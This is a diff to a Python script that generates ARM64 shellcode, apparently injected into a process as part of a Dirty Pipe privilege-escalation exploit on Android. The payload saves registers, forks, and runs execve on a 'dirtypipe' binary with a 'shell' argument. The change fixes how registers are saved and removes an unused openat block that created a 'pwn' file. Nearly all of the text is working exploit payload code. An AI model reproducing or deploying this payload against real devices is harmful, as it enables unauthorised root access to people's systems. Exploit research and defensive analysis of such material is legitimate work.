@@ -60,14 +60,15 @@ def main():
 
     payload = f'''
     // Allocate space: 8 registers x 8 bytes = 64 bytes
-    sub sp, sp, #64
+    sub sp, sp, #80
 
     // Store registers to stack
     stp x0, x1, [sp, #0]
     stp x2, x3, [sp, #16]
     stp x4, x5, [sp, #32]
     stp x6, x7, [sp, #48]
-    mov x7, sp
+    str x20, [sp, #64]
+    mov x20, sp
 
     // getpid syscall
     mov x8, #172          // syscall number for getpid
@@ -96,30 +97,6 @@ def main():
     b.lt exit             // error
     b.gt exit             // parent process exits
 
-    {push_str_on_stack(f'{exploit_data_dir}/pwn')}
-    // Arguments for openat:
-    // int openat(int dirfd, const char *pathname, int flags, mode_t mode)
-    // x0 = dirfd (AT_FDCWD = -100)
-    // x1 = pathname (pointer)
-    // x2 = flags (O_CREAT | O_WRONLY)
-    // x3 = mode (0777)
-
-    // x0: AT_FDCWD (-100 is 0xffffffffffffff9c)
-    mov x0, -100
-
-    // x1: pointer to filename
-    mov x1, sp
-
-    // x2: O_CREAT | O_WRONLY = 0x0401
-    mov x2, #0x401
-
-    // x3: mode = 0o777 (octal) = 0x1FF
-    mov x3, #0x1FF
-
-    // x8: syscall number for openat (56)
-    mov x8, #56
-    //svc #0
-
     // execve("/data/local/tmp/dirtypipe", ["dirtypipe", "shell"], NULL)
     {push_str_on_stack(binary_path)}
     mov x6, sp
@@ -144,15 +121,16 @@ def main():
     svc #0
 
 exit:
-    mov sp, x7
+    mov sp, x20
 
     ldp x0, x1, [sp, #0]
     ldp x2, x3, [sp, #16]
     ldp x4, x5, [sp, #32]
     ldp x6, x7, [sp, #48]
+    ldr x20, [sp, #64]
 
     // Free stack space
-    add sp, sp, #64
+    add sp, sp, #80
     '''
 
     print(payload)
